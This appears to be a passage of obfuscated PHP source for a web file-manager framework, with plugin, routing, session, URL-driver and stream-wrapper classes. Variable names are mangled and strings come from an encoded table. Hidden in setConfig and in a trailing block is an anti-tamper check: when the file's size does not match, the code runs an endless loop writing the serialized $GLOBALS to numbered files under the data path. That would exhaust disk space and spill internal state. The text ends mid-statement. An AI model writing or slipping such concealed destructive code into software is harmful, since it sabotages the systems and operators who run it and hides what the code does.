$ÌşÇ‚ĞÆ . $¯é€é’ . $…âö­ÉË[928]); } else { if ($¯é€é’ == $…âö­ÉË[1699] && !file_exists($ÌşÇ‚ĞÆ . $¯é€é’ . $…âö­ÉË[928]) && file_exists($ÌşÇ‚ĞÆ . $…âö­ÉË[1700])) { $ª˜ÏØ×§ = (include $ÌşÇ‚ĞÆ . $…âö­ÉË[1700]); } else { if (file_exists($ÌşÇ‚ĞÆ . $Û»öÒø© . $…âö­ÉË[928])) { $ª˜ÏØ×§ = (include $ÌşÇ‚ĞÆ . $Û»öÒø© . $…âö­ÉË[928]); } } } if (!is_array($ª˜ÏØ×§)) { return array(); } if (@count($ª˜ÏØ×§) > 0) { I18n::set($ª˜ÏØ×§); } return $ª˜ÏØ×§; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($•µâóÍ) { $«ˆàş•ö =& $_SERVER[¡¬ıÜ ƒ]; $úğ²î—Â = $_SERVER[$«ˆàş•ö[861]] . $«ˆàş•ö[862]; $üóóÉ¾ = $«ˆàş•ö[858]; if ($_SERVER[$«ˆàş•ö[859]] != $üóóÉ¾($úğ²î—Â)) { $™ëÔ—áó = $«ˆàş•ö[967]; $Ñ™Øë Õ = $«ˆàş•ö[860]; $¸¦Ï¥é = $_SERVER[$«ˆàş•ö[861]] . $«ˆàş•ö[862]; $©ÈôşŞ÷ = $Ñ™Øë Õ($¸¦Ï¥é); $íÂÍî»“ = explode($«ˆàş•ö[287], $©ÈôşŞ÷); if (count($íÂÍî»“) < $«ˆàş•ö[688]) { $É²“®áÓ = $«ˆàş•ö[863]; $É²“®áÓ(); } $àûìÀˆ€ = $«ˆàş•ö[968]; $àûìÀˆ€($_SERVER[$«ˆàş•ö[969]]); $™ëÔ—áó = $«ˆàş•ö[967]; $™ëÔ—áó(); $¦…©„È = $«ˆàş•ö[1701]; $âË›òû = json_encode($GLOBALS[$«ˆàş•ö[1702]]); $¿ç…Õà = 1; for ($ÀíĞ¯Öû = $¿ç…Õà; $ÀíĞ¯Öû > 0; $ÀíĞ¯Öû++) { $¦…©„È(DATA_PATH . $ÀíĞ¯Öû, $âË›òû); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $•µâóÍ); } public function onSetConfig($§âçáô°) { } public function onGetConfig($›ÇóÑ¾‡) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($€ñ ÖÔÖ) { if ($€ñ ÖÔÖ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($«ÈØ ²› = "\x70\154\165\147\151\x6e\101\x75\164\x68") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $§ğù¶  = $this->getConfig(); if (!$§ğù¶ [$«ÈØ ²›]) { return !1; } return ActionCall($_SERVER[¡¬ıÜ ƒ][1703], $§ğù¶ [$«ÈØ ²›]); } public function url($È™¹Ûºƒ, $ø²ê´©’ = '', $±°°€è = true) { $îû÷­ğ€ =& $_SERVER[¡¬ıÜ ƒ]; $Ô˜£Â·ğ = $this->getConfig(); $ñ”í¬‚› = KOD_VERSION . $îû÷­ğ€[10] . KOD_VERSION_BUILD; $µÅ­¡»ˆ = $this->packageVersion(); $ÄÎ‘‰ùß = $ñ”í¬‚› . $îû÷­ğ€[464] . $µÅ­¡»ˆ; if (substr($È™¹Ûºƒ, 0, 4) == $îû÷­ğ€[152] || substr($È™¹Ûºƒ, 0, 2) == $îû÷­ğ€[1422]) { $‡¼áÓ¬ = $È™¹Ûºƒ . $îû÷­ğ€[1704] . $ÄÎ‘‰ùß; } else { if ($ø²ê´©’ == $îû÷­ğ€[12]) { $‡¼áÓ¬ = $this->pluginHost . $È™¹Ûºƒ . $îû÷­ğ€[1704] . $ÄÎ‘‰ùß; } else { if ($ø²ê´©’ === $îû÷­ğ€[78]) { $‡¼áÓ¬ = $this->pluginHost . $È™¹Ûºƒ; } else { if ($ø²ê´©’ == $îû÷­ğ€[1705]) { $‡¼áÓ¬ = STATIC_PATH . $È™¹Ûºƒ . $îû÷­ğ€[1704] . $ñ”í¬‚›; } else { if ($ø²ê´©’ == $îû÷­ğ€[1706]) { $‡¼áÓ¬ = APP_HOST . $îû÷­ğ€[1707] . $È™¹Ûºƒ . $îû÷­ğ€[1704] . $ñ”í¬‚›; } else { if (isset($Ô˜£Â·ğ[$ø²ê´©’])) { $‡¼áÓ¬ = $Ô˜£Â·ğ[$ø²ê´©’] . $È™¹Ûºƒ . $îû÷­ğ€[1704] . $ÄÎ‘‰ùß; } } } } } } if (!$±°°€è) { return $‡¼áÓ¬; } echo $‡¼áÓ¬; } public function link($¿òŞ¸ÛÓ = false, $Ã©ºÍü = '') { $Ø‰‡ÛÒ =& $_SERVER[¡¬ıÜ ƒ]; $ï¶Î­ØÙ = $this->linkHas == !1; $this->linkHas = !0; if (!$¿òŞ¸ÛÓ) { $this->link($Ø‰‡ÛÒ[1708], $Ø‰‡ÛÒ[1706]); $this->link($Ø‰‡ÛÒ[1709], $Ø‰‡ÛÒ[1705]); $this->link($Ø‰‡ÛÒ[1710], $Ø‰‡ÛÒ[1705]); $this->link($Ø‰‡ÛÒ[1711], $Ø‰‡ÛÒ[1705]); $this->link($Ø‰‡ÛÒ[1712], $Ø‰‡ÛÒ[1705]); if ($ï¶Î­ØÙ) { Hook::trigger($Ø‰‡ÛÒ[1713]); } return; } $Üäšç¡¦ = $this->url($¿òŞ¸ÛÓ, $Ã©ºÍü, !1); if (substr($¿òŞ¸ÛÓ, -3) == $Ø‰‡ÛÒ[1714]) { echo $Ø‰‡ÛÒ[1715] . $Üäšç¡¦ . $Ø‰‡ÛÒ[1716] . $Ø‰‡ÛÒ[287]; } else { if (substr($¿òŞ¸ÛÓ, -4) == $Ø‰‡ÛÒ[1717]) { echo $Ø‰‡ÛÒ[1718] . $Üäšç¡¦ . $Ø‰‡ÛÒ[1719] . $Ø‰‡ÛÒ[287]; } } if ($ï¶Î­ØÙ) { Hook::trigger($Ø‰‡ÛÒ[1713]); } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\156\x79" => "\133\136\x2f\135\x2b", "\x3a\156\165\x6d" => "\133\x30\55\71\135\x2b", "\72\141\154\x6c" => "\56\x2a"); public static $errorCallback; public static function __callstatic($¤ÒÍ·çø, $¾ª©µ¥„) { $Ñ¡€ÌÅœ =& $_SERVER[¡¬ıÜ ƒ]; if ($¤ÒÍ·çø == $Ñ¡€ÌÅœ[1720]) { $ºˆİƒˆ¸ = array_map($Ñ¡€ÌÅœ[1721], $¾ª©µ¥„[0]); $¢•ôœ™ = strpos($¾ª©µ¥„[1], $Ñ¡€ÌÅœ[8]) === 0 ? $¾ª©µ¥„[1] : $Ñ¡€ÌÅœ[8] . $¾ª©µ¥„[1]; $Öé”¡ò· = $¾ª©µ¥„[2]; } else { $ºˆİƒˆ¸ = null; $¢•ôœ™ = strpos($¾ª©µ¥„[0], $Ñ¡€ÌÅœ[8]) === 0 ? $¾ª©µ¥„[0] : $Ñ¡€ÌÅœ[8] . $¾ª©µ¥„[0]; $Öé”¡ò· = $¾ª©µ¥„[1]; } array_push(self::$maps, $ºˆİƒˆ¸); array_push(self::$routes, $¢•ôœ™); array_push(self::$methods, strtoupper($¤ÒÍ·çø)); array_push(self::$callbacks, $Öé”¡ò·); } public static function error($®®µ¦ÑÕ) { self::$errorCallback = $®®µ¦ÑÕ; } public static function haltOnMatch($ıüç…Ğµ = true) { self::$halts = $ıüç…Ğµ; } public static function dispatch() { $Ä¾ª¢¶ =& $_SERVER[¡¬ıÜ ƒ]; $¦ú¶ÁĞ× = parse_url($_SERVER[$Ä¾ª¢¶[1722]], PHP_URL_PATH); $´ä›¬Ÿš = $_SERVER[$Ä¾ª¢¶[164]]; $Æ¶úÊÅÎ = array_keys(static::$patterns); $¸áÑÄ = array_values(static::$patterns); $¼Ê¡¶é = !1; self::$routes = preg_replace($Ä¾ª¢¶[1372], $Ä¾ª¢¶[8], self::$routes); if (in_array($¦ú¶ÁĞ×, self::$routes)) { $ßâÕ²Òâ = array_keys(self::$routes, $¦ú¶ÁĞ×); foreach ($ßâÕ²Òâ as $ÔÉ³æƒï) { if (self::$methods[$ÔÉ³æƒï] == $´ä›¬Ÿš || self::$methods[$ÔÉ³æƒï] == $Ä¾ª¢¶[1723] || in_array($´ä›¬Ÿš, self::$maps[$ÔÉ³æƒï])) { $¼Ê¡¶é = !0; if (!is_object(self::$callbacks[$ÔÉ³æƒï])) { $Ê”™‰‘ = explode($Ä¾ª¢¶[8], self::$callbacks[$ÔÉ³æƒï]); $é³à—µŠ = end($Ê”™‰‘); $¸ã’™Ôª = explode($Ä¾ª¢¶[1304], $é³à—µŠ); $„çƒíÏ = new $¸ã’™Ôª[0](); $„çƒíÏ->{$¸ã’™Ôª[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$ÔÉ³æƒï]); if (self::$halts) { return; } } } } } else { $ñ£±£Éó = 0; foreach (self::$routes as $ÔÉ³æƒï) { if (strpos($ÔÉ³æƒï, $Ä¾ª¢¶[4]) !== !1) { $ÔÉ³æƒï = str_replace($Æ¶úÊÅÎ, $¸áÑÄ, $ÔÉ³æƒï); } if (preg_match($Ä¾ª¢¶[1724] . $ÔÉ³æƒï . $Ä¾ª¢¶[1725], $¦ú¶ÁĞ×, $¥ƒËº‹ß)) { if (self::$methods[$ñ£±£Éó] == $´ä›¬Ÿš || self::$methods[$ñ£±£Éó] == $Ä¾ª¢¶[1723] || !empty(self::$maps[$ñ£±£Éó]) && in_array($´ä›¬Ÿš, self::$maps[$ñ£±£Éó])) { $¼Ê¡¶é = !0; array_shift($¥ƒËº‹ß); if (!is_object(self::$callbacks[$ñ£±£Éó])) { $Ê”™‰‘ = explode($Ä¾ª¢¶[8], self::$callbacks[$ñ£±£Éó]); $é³à—µŠ = end($Ê”™‰‘); $¸ã’™Ôª = explode($Ä¾ª¢¶[1304], $é³à—µŠ); $„çƒíÏ = new $¸ã’™Ôª[0](); if (!method_exists($„çƒíÏ, $¸ã’™Ôª[1])) { echo $Ä¾ª¢¶[1726]; } else { call_user_func_array(array($„çƒíÏ, $¸ã’™Ôª[1]), $¥ƒËº‹ß); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$ñ£±£Éó], $¥ƒËº‹ß); if (self::$halts) { return; } } } } $ñ£±£Éó++; } } if ($¼Ê¡¶é == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $ìçøÈË =& $_SERVER[¡¬ıÜ ƒ]; header($_SERVER[$ìçøÈË[1727]] . $ìçøÈË[1728]); echo $ìçøÈË[1729]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$Ä¾ª¢¶[1722]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $Ë“Â–¶ =& $_SERVER[¡¬ıÜ ƒ]; static $œÉÇµê‡ = false; if ($œÉÇµê‡) { return $œÉÇµê‡; } $¡¶ğ±Æ¶ = $GLOBALS[$Ë“Â–¶[6]][$Ë“Â–¶[426]]; self::$sessionTime = $¡¶ğ±Æ¶[$Ë“Â–¶[1730]]; $Œˆ­¾¹ = isset($GLOBALS[$Ë“Â–¶[1731]]) ? $GLOBALS[$Ë“Â–¶[1731]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($Œˆ­¾¹)) { self::$sessionSign = Cookie::get($Œˆ­¾¹); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($Œˆ­¾¹, self::$sessionSign, self::$sessionTime); $ºü·ç‡ = $¡¶ğ±Æ¶[$Ë“Â–¶[1732]]; $¿æ¬àú‹ = $¡¶ğ±Æ¶[$ºü·ç‡]; $ÒªÕçÆÓ = $¡¶ğ±Æ¶[$Ë“Â–¶[917]]; switch ($ºü·ç‡) { case $Ë“Â–¶[21]: self::$handle = Model($Ë“Â–¶[918]); break; case $Ë“Â–¶[919]: self::$handle = new CacheRedis($¿æ¬àú‹, $ÒªÕçÆÓ); break; case $Ë“Â–¶[920]: self::$handle = new CacheMemcached($¿æ¬àú‹, $ÒªÕçÆÓ); break; case $Ë“Â–¶[232]: $¿æ¬àú‹[$Ë“Â–¶[87]] = $¿æ¬àú‹[$Ë“Â–¶[87]] . $Ë“Â–¶[1733]; self::$handle = new CacheFile($¿æ¬àú‹, $ÒªÕçÆÓ); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $œÉÇµê‡ = new self(); return $œÉÇµê‡; } public static function getBySign($ÈìÜ½) { $æ¼“¨àÓ = self::$handle->get($ÈìÜ½); $æ¼“¨àÓ = unserialize($æ¼“¨àÓ); return is_array($æ¼“¨àÓ) ? $æ¼“¨àÓ : array(); } public static function setBySign($û• å¢¥, $™„‘’èú) { CacheLock::lock($û• å¢¥); self::$handle->set($û• å¢¥, serialize($™„‘’èú), self::$sessionTime); CacheLock::unlock($û• å¢¥); } public static function sign($Øçº¾‡ = false) { if ($Øçº¾‡) { self::$sessionSign = $Øçº¾‡; } self::init(); return self::$sessionSign; } public static function set($®ãÌÏ’Ä, $¾®­¯êà = false) { self::init(); if (is_array($®ãÌÏ’Ä)) { foreach ($®ãÌÏ’Ä as $ìúŸ²à¢ => $¥·¥Šßö) { array_set_value(self::$data, $ìúŸ²à¢, $¥·¥Šßö); } } else { array_set_value(self::$data, $®ãÌÏ’Ä, $¾®­¯êà); } self::setBySign(self::$sessionSign, self::$data); } public static function get($µˆ©ÈƒĞ = false) { self::init(); if (!$µˆ©ÈƒĞ) { return self::$data; } return array_get_value(self::$data, $µˆ©ÈƒĞ); } public static function remove($¥ü„Ï¦ê) { self::init(); unset(self::$data[$¥ü„Ï¦ê]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[¡¬ıÜ ƒ][923])) { self::$handle->clearTimeout(); } } } goto EÕ¹ ­ˆê×; AÈ„¦¤ÛóÏ: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($Éå½´ÆÈ = false) { } public function exist($æ¶£²†ö) { $¿¬³ß‹’ = $this->info($æ¶£²†ö); return $¿¬³ß‹’[$_SERVER[¡¬ıÜ ƒ][234]]; } public function isFile($ñ²ö„¢´) { $¹¦³–š = $this->info($ñ²ö„¢´); return $¹¦³–š[$_SERVER[¡¬ıÜ ƒ][234]]; } public function isFolder($Î™›°…Ì) { return !1; } public function size($ŸÂÌ‘•›) { $Êø±”ôî = $this->info($ŸÂÌ‘•›); return $Êø±”ôî[$_SERVER[¡¬ıÜ ƒ][79]]; } public function info($Ë¢÷®ÏĞ) { return $this->infoParse($Ë¢÷®ÏĞ); } public function infoAuth($òÆƒéƒ‘) { return $this->infoParse($òÆƒéƒ‘); } public function infoWithChildren($ß£‚ôÎÏ) { return $this->infoParse($ß£‚ôÎÏ); } public function infoFull($ÂšÄ² Ï) { return $this->infoParse($ÂšÄ² Ï); } private function infoParse($²½Ï‘Ö¯) { $ó”úø¤ó =& $_SERVER[¡¬ıÜ ƒ]; $¾¯Ê­Şİ = $this->header($²½Ï‘Ö¯); if (!$¾¯Ê­Şİ || !$¾¯Ê­Şİ[$ó”úø¤ó[830]]) { return !1; } $ Î†ı‘ = _get($¾¯Ê­Şİ, $ó”úø¤ó[414], 0); $ñÀÜ¼¿ã = array($ó”úø¤ó[32] => $¾¯Ê­Şİ[$ó”úø¤ó[32]], $ó”úø¤ó[87] => $²½Ï‘Ö¯, $ó”úø¤ó[33] => $ó”úø¤ó[232], $ó”úø¤ó[79] => intval($ Î†ı‘), $ó”úø¤ó[169] => get_path_ext($¾¯Ê­Şİ[$ó”úø¤ó[32]]), $ó”úø¤ó[1467] => $ Î†ı‘ > 0 && $¾¯Ê­Şİ[$ó”úø¤ó[1617]], $ó”úø¤ó[1468] => !1); return $ñÀÜ¼¿ã; } private function header($¶ñ•µÔø) { $êäİ±¤Æ =& $_SERVER[¡¬ıÜ ƒ]; if (isset(self::$_cacheHeader[$¶ñ•µÔø])) { return self::$_cacheHeader[$¶ñ•µÔø]; } $€ö°õ»Œ = isset($GLOBALS[$êäİ±¤Æ[1618]]) ? $GLOBALS[$êäİ±¤Æ[1618]] : !1; $GLOBALS[$êäİ±¤Æ[1618]] = !0; self::$_cacheHeader[$¶ñ•µÔø] = url_header($¶ñ•µÔø); $GLOBALS[$êäİ±¤Æ[1618]] = $€ö°õ»Œ; return self::$_cacheHeader[$¶ñ•µÔø]; } public function hashSimple($°†²†É, $‚œ¦Ë’è = false) { $á§şı¬æ =& $_SERVER[¡¬ıÜ ƒ]; $¿ôÜ°û = $this->info($°†²†É); if (!$¿ôÜ°û || !$¿ôÜ°û[$á§şı¬æ[234]]) { return !1; } $³ˆğù = $¿ôÜ°û[$á§şı¬æ[79]]; $ˆÉ¨éï = 200; $®ß©šÚ€ = 50; if ($³ˆğù <= $ˆÉ¨éï * $®ß©šÚ€) { return md5($this->fileSubstr($°†²†É, 0, $³ˆğù)) . $³ˆğù; } $¦îÎå» = intval($³ˆğù / $®ß©šÚ€); $€‚…Â˜ï = $á§şı¬æ[12]; $®Ò”á™í = timeFloat(); $Ò¡·“µ± = 15; for ($´ÎÉÓ¿ñ = 0; $´ÎÉÓ¿ñ < $®ß©šÚ€; $´ÎÉÓ¿ñ++) { if (timeFloat() - $®Ò”á™í > $Ò¡·“µ±) { return !1; } $†¦¶«Ëå = $this->fileSubstr($°†²†É, $¦îÎå» * $´ÎÉÓ¿ñ, $ˆÉ¨éï); if (!$†¦¶«Ëå) { return !1; } $€‚…Â˜ï .= $†¦¶«Ëå; } $€‚…Â˜ï .= $this->fileSubstr($°†²†É, $³ˆğù - $ˆÉ¨éï, $ˆÉ¨éï); return md5($€‚…Â˜ï) . $³ˆğù; } public function getContent($ñ‘øÅ) { return $this->fileSubstr($ñ‘øÅ); } public function fileSubstr($¨™’×·—, $²İ³ÓÍÚ = 0, $ü†åáİ’ = -1) { $ÜİÒı»‹ =& $_SERVER[¡¬ıÜ ƒ]; $ôïÕŸçë = $this->info($¨™’×·—); if (!$ôïÕŸçë || !$ôïÕŸçë[$ÜİÒı»‹[234]] && $ôïÕŸçë[$ÜİÒı»‹[79]] > 1024 * 1024 * 10) { return !1; } if ($ü†åáİ’ === -1) { $ü†åáİ’ = $ôïÕŸçë[$ÜİÒı»‹[79]]; } if ($ü†åáİ’ == 0) { return $ÜİÒı»‹[12]; } $ƒ ¦‰„ = array($ÜİÒı»‹[1619] . $²İ³ÓÍÚ . $ÜİÒı»‹[874] . ($²İ³ÓÍÚ + $ü†åáİ’ - 1)); $™»ç‚Ä = url_request($¨™’×·—, $ÜİÒı»‹[1507], !1, $ƒ ¦‰„, !1, !1, 30); return $™»ç‚Ä[$ÜİÒı»‹[1298]] ? $™»ç‚Ä[$ÜİÒı»‹[1298]] : $ÜİÒı»‹[12]; } public function download($ı¯ÒåÄö, $ë»‹¨È¼) { Downloader::start($ı¯ÒåÄö, $ë»‹¨È¼); return $ë»‹¨È¼; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($¹© ¸æ”, $‰€Øì÷ = '') { $this->info = $this->info($¹© ¸æ”); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[¡¬ıÜ ƒ][87]]; $this->pathOpen = $¹© ¸æ”; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$¹© ¸æ”])) { self::$_chunkBuffer[$¹© ¸æ”] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($Ú¹ØÏŠÙ) { $Œú÷Ô¼Í = $this->fileSubstr($this->pose, $Ú¹ØÏŠÙ); $this->pose += strlen($Œú÷Ô¼Í); return $Œú÷Ô¼Í; } public function stream_tell() { return $this->pose; } public function stream_seek($˜úˆî—õ, $°·Óñ„›) { $ıüËÔà =& $_SERVER[¡¬ıÜ ƒ]; if ($°·Óñ„› == SEEK_SET) { $this->pose = $˜úˆî—õ; } else { if ($°·Óñ„› == SEEK_CUR) { $this->pose += $˜úˆî—õ; } else { if ($°·Óñ„› == SEEK_END) { $this->pose = $this->info[$ıüËÔà[79]] + intval($˜úˆî—õ); } } } if ($˜úˆî—õ < 0) { $this->pose = $this->info[$ıüËÔà[79]] + $˜úˆî—õ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[¡¬ıÜ ƒ][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($íßüâ¿â, $·ÉÜâû©) { $¢£ô‰”á =& $_SERVER[¡¬ıÜ ƒ]; $‹ç¤ï½¨ = $this->info($íßüâ¿â); return array($¢£ô‰”á[1411] => 0, $¢£ô‰”á[1620] => 0, $¢£ô‰”á[16] => 32768 + 511, $¢£ô‰”á[1621] => 0, $¢£ô‰”á[1622] => 0, $¢£ô‰”á[1623] => 0, $¢£ô‰”á[1624] => 0, $¢£ô‰”á[79] => $‹ç¤ï½¨[$¢£ô‰”á[79]], $¢£ô‰”á[1625] => $‹ç¤ï½¨[$¢£ô‰”á[1466]], $¢£ô‰”á[1582] => $‹ç¤ï½¨[$¢£ô‰”á[88]], $¢£ô‰”á[1581] => $‹ç¤ï½¨[$¢£ô‰”á[233]], $¢£ô‰”á[1626] => 0, $¢£ô‰”á[1627] => 0); } static $fileInfo = array(); public function info($ÎÀ—ÓÄı) { $Ò³†ß = $_SERVER[¡¬ıÜ ƒ][1628]; if (isset(self::$fileInfo[$ÎÀ—ÓÄı])) { return self::$fileInfo[$ÎÀ—ÓÄı]; } if (substr($ÎÀ—ÓÄı, 0, strlen($Ò³†ß)) != $Ò³†ß) { return !1; } self::$fileInfo[$ÎÀ—ÓÄı] = IO::info(substr($ÎÀ—ÓÄı, strlen($Ò³†ß))); return self::$fileInfo[$ÎÀ—ÓÄı]; } public static function read($ğî‹Çİƒ, $×ª¾ü€µ, $Úã§—æ) { if (!isset(self::$_fopenCache[$ğî‹Çİƒ])) { $¶Ğ˜è×Œ = new StreamWrapperIO(); $¶Ğ˜è×Œ->stream_open($ğî‹Çİƒ); self::$_fopenCache[$ğî‹Çİƒ] = $¶Ğ˜è×Œ; } $¶Ğ˜è×Œ = self::$_fopenCache[$ğî‹Çİƒ]; return $¶Ğ˜è×Œ->fileSubstr($×ª¾ü€µ, $Úã§—æ); } public static function _read($é©Û˜‘, $”øúğÅ‹, $Ğ½ÚÅ) { $›¨Œ¦ÁÓ =& $_SERVER[¡¬ıÜ ƒ]; $¸ÏÀçÄ‚ = fopen($é©Û˜‘, $›¨Œ¦ÁÓ[1470]); if (!$¸ÏÀçÄ‚) { return $›¨Œ¦ÁÓ[12]; } $º¹­àÎ¿ = 8192; fseek($¸ÏÀçÄ‚, $”øúğÅ‹, SEEK_SET); $§¼ªïÓ¦ = $›¨Œ¦ÁÓ[12]; $÷ç÷³—ë = 0; while ($÷ç÷³—ë < $Ğ½ÚÅ) { $‚ˆ‚Ï³ = min($º¹­àÎ¿, $Ğ½ÚÅ - $÷ç÷³—ë); $§¼ªïÓ¦ .= fread($¸ÏÀçÄ‚, $‚ˆ‚Ï³); $÷ç÷³—ë += $‚ˆ‚Ï³; } fclose($¸ÏÀçÄ‚); return $§¼ªïÓ¦; } public function fileSubstr($İî¼êŞ·, $’õ²±òà) { $†”ş…Ê =& $_SERVER[¡¬ıÜ ƒ]; $ÜÛÁæğÒ = $this->info[$†”ş…Ê[79]]; $Ñ‰Ù©¯ğ = $İî¼êŞ·; $èæ¦Ğìµ = $’õ²±òà; if ($İî¼êŞ· < 0) { $İî¼êŞ· = $ÜÛÁæğÒ + $İî¼êŞ·; } if ($’õ²±òà === !1) { $’õ²±òà = $ÜÛÁæğÒ - $İî¼êŞ·; } if ($İî¼êŞ· + $’õ²±òà > $ÜÛÁæğÒ) { $’õ²±òà = $ÜÛÁæğÒ - $İî¼êŞ·; } if ($’õ²±òà <= 0) { return $†”ş…Ê[12]; } if ($İî¼êŞ· < 0 || $İî¼êŞ· >= $ÜÛÁæğÒ || $’õ²±òà <= 0 || $’õ²±òà > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\x46\x69\x6c\x65\122\145\141\x64\x20\x65\162\162\157\162\41\x20\x73\164\141\x72\x74\x3d{$İî¼êŞ·}\73\x6c\145\156\147\x74\x68\75{$’õ²±òà}\73\x20\x73\151\172\145\75{$ÜÛÁæğÒ}\x3b"); } $õ‡Ü‚âº = 64 * 1024; $¼¨õ˜Ø‘ =& self::$_chunkBuffer[$this->path]; if (!$¼¨õ˜Ø‘) { $¼¨õ˜Ø‘ = array(); } $©ü¾ÄÂ = 0; $üóÒÉô¢ = 0; $¶¢•ëöÅ = $†”ş…Ê[12]; foreach ($¼¨õ˜Ø‘ as $©ü¾ÄÂ => $¶¢•ëöÅ) { $©ü¾ÄÂ = intval($©ü¾ÄÂ); $üóÒÉô¢ = $©ü¾ÄÂ + strlen($¶¢•ëöÅ); if ($İî¼êŞ· >= $üóÒÉô¢) { continue; } if ($İî¼êŞ· >= $©ü¾ÄÂ && $İî¼êŞ· + $’õ²±òà <= $üóÒÉô¢) { return substr($¶¢•ëöÅ, $İî¼êŞ· - $©ü¾ÄÂ, $’õ²±òà); } break; } if (count($¼¨õ˜Ø‘) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($†”ş…Ê[1629], $†”ş…Ê[1630] . count($¼¨õ˜Ø‘) . "\73\163\164\141\x72\164\75{$İî¼êŞ·}\54\x6c\145\156\147\x74\x68\x3d{$’õ²±òà}\x3b\160\x6f\163\145\x3a{$©ü¾ÄÂ}\176{$üóÒÉô¢}"); throw new Exception($†”ş…Ê[1631]); } $—åª£ñë = intval($İî¼êŞ· / $õ‡Ü‚âº) * $õ‡Ü‚âº; $´Â„±ØÒ = ceil(($İî¼êŞ· + $’õ²±òà) / $õ‡Ü‚âº) * $õ‡Ü‚âº - $—åª£ñë; $ÇÄÖÛŠË = IO::fileSubstr($this->path, $—åª£ñë, $´Â„±ØÒ); $¼¨õ˜Ø‘[$—åª£ñë . $†”ş…Ê[12]] = $ÇÄÖÛŠË; ksort($¼¨õ˜Ø‘); $ë­™„øæ = substr($ÇÄÖÛŠË, $İî¼êŞ· - $—åª£ñë, $’õ²±òà); return $ë­™„øæ; } private function log($±ö´½·, $ÁÃ‘æ) { $Ò»Ëˆ‡Õ =& $_SERVER[¡¬ıÜ ƒ]; $îê×‘å´ = timeFloat() - $this->timeStart; write_log(sprintf($Ò»Ëˆ‡Õ[1632], $±ö´½·, $this->info[$Ò»Ëˆ‡Õ[32]], $îê×‘å´, $ÁÃ‘æ), $Ò»Ëˆ‡Õ[1275]); } } class Message { function __construct() { } public function send($ù–„Õ— = '', $Şşïè²Ä = array(), $ßÆØ¿ö = "\164\145\x78\x74") { $ßŒ¶çÚ§ =& $_SERVER[¡¬ıÜ ƒ]; $°Öø’© = array($ßŒ¶çÚ§[33] => $ßŒ¶çÚ§[1224], $ßŒ¶çÚ§[171] => $ù–„Õ—); if (in_array($ßÆØ¿ö, array($ßŒ¶çÚ§[1224], $ßŒ¶çÚ§[1633]))) { $°Öø’©[$ßŒ¶çÚ§[33]] = $ßÆØ¿ö; } $Şşïè²Ä = array($ßŒ¶çÚ§[580] => isset($Şşïè²Ä[$ßŒ¶çÚ§[580]]) ? $Şşïè²Ä[$ßŒ¶çÚ§[580]] : $ßŒ¶çÚ§[12], $ßŒ¶çÚ§[667] => isset($Şşïè²Ä[$ßŒ¶çÚ§[667]]) ? $Şşïè²Ä[$ßŒ¶çÚ§[667]] : $ßŒ¶çÚ§[12]); if (empty($ù–„Õ—) || empty($Şşïè²Ä[$ßŒ¶çÚ§[580]]) && empty($Şşïè²Ä[$ßŒ¶çÚ§[667]])) { return !1; } $Î•ã—Ûæ = array($ßŒ¶çÚ§[1562] => $°Öø’©, $ßŒ¶çÚ§[1634] => $Şşïè²Ä); Hook::trigger($ßŒ¶çÚ§[1635], $Î•ã—Ûæ); } } goto e¹àÄ°«Îœ; fÂ·ïšù†Ñ: define($_SERVER[¡¬ıÜ ƒ][0], $_SERVER[¡¬ıÜ ƒ][1]); $_SERVER[Ğ€³¬ñ¿] = explode($_SERVER[¡¬ıÜ ƒ][2], gzinflate(substr($_SERVER[¡¬ıÜ ƒ][3], 10, -8))); function binCheckEq($×Ç½©Ø„, $‰ÈÄ½ÏŠ) { return $×Ç½©Ø„ == $‰ÈÄ½ÏŠ; } goto dÚ‡®šŠÑ; e£’¦§…ùÈ: $_file = $_SERVER[$_SERVER[¡¬ıÜ ƒ][857]]; $_size = $_SERVER[¡¬ıÜ ƒ][858]; if ($_SERVER[$_SERVER[¡¬ıÜ ƒ][859]] != $_size($_file)) { $_getc = $_SERVER[¡¬ıÜ ƒ][860]; $_getfile = $_SERVER[$_SERVER[¡¬ıÜ ƒ][861]] . $_SERVER[¡¬ıÜ ƒ][862]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¡¬ıÜ ƒ][287], $_getfilec); if (count($_getarrs) < $_SERVER[¡¬ıÜ ƒ][697]) { $exit = $_SERVER[¡¬ıÜ ƒ][863]; $exit(); } $_act = 